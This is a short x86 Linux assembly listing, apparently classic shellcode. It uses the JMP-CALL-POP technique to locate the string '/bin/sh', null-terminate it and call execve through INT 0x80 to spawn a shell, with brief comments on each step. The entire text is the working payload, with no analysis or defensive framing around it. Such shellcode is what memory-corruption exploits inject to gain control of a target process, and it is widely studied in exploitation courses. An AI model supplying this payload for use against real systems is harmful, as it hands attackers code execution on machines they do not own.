JMP _WANT_BIN_BASH

_GOT_BIN_BASH:
    POP EBX           # EBX points to "/bin/sh"
    XOR EAX, EAX
    XOR EDX, EDX 
    MOV BYTE PTR [EBX+7], DL
    
    PUSH EDX          # argv[1] = NULL
    PUSH EBX          # argv[0] = EBX
    
    MOV ECX, ESP      # ECX = &argv[0]

    MOV AL, 0x0B      # execve syscall number
    INT 0x80
    
_WANT_BIN_BASH:
    CALL _GOT_BIN_BASH
    .ASCII "/bin/shX"
